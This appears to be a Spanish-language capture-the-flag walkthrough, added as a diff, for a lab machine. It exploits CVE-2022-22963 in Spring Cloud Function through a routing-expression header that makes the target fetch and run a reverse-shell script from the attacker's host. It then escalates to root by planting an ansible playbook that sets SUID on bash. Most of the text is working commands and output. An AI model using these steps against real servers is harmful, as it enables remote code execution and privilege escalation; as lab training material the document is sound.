@@ -1,0 +1,92 @@
+-> usando el exploit 
+> python3 exploit.py -u 'http://10.10.11.204:8080'
+
+[+] Target http://10.10.11.204:8080
+[+] Checking if http://10.10.11.204:8080 is vulnerable to CVE-2022-22963...
+[+] http://10.10.11.204:8080 is vulnerable
+[/] Attempt to take a reverse shell? [y/n]y
+
+-> usando curl (metodo saavitar)
+> curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.6")' -d '.'
+> python3 -m http.server 80
+
+> python3 -m http.server 80
+> curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.6 -o /tmp/reverse")' -d '.'
+
+> nc -nlvp 443
+> curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse")' -d '.'
+
+-> ya en la consola hacer el tratamiento.
+> script /dev/null -c bash
+> (CTRL+Z)
+> stty raw -echo; fg
+> reset xterm
+
+-> adicionales
+> echo $TERM  
+> export TERM=xterm //para limpiar la consola
+
+> export TERM=xterm-256color //colores
+> source /etc/skel/.bashrc
+
+> stty size             //dimensiones
+> stty rows 44 columns 184
+
+-> Usando las credenciales de phil
+> su phil 
+
+-> obtenemos la primera flag
+> cd 
+> cat user.txt
+c28770c7097660c4160525c0bb605481
+
+> id
+uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
+> find / -group staff 2>/dev/null
+/opt/automation/tasks
+/root
+/var/local
+
+//montar un proc_mon (se puede usar pspy tambien) 
+> cd /tmp/
+> nano procmon.sh
+#!/bin/bash
+
+old_process=$(ps -eo user,command)
+
+while true; do
+        new_process=$(ps -eo user,command)
+        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|kworker|command"
+        old_process=$new_process
+done
+
+> chmod +x procmon.sh
+> ./procmon.sh
+root     /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
+root     /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml
+root     /usr/bin/python3 /usr/local/bin/ansible-parallel /opt/automation/tasks/playbook_1.yml
+
+> cat /opt/automation/tasks/playbook_1.yml 
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    ansible.builtin.systemd:
+      name: webapp
+      enabled: yes
+      state: started
+> cp /opt/automation/tasks/playbook_1.yml /opt/automation/tasks/test.yml
+> nano /opt/automation/tasks/test.yml
+host: localhost
+  tasks:
+  - name: Checking webapp service
+    ansible.builtin.shell: chmod u+s /bin/bash
+
+> watch -n 1 ls  -l /bin/bash
+> bash -p // ya soy root
+> whoami
+root
+
+> cat /root/root.txt
+ea31e02b33f787947674db0d802d709a
+
+
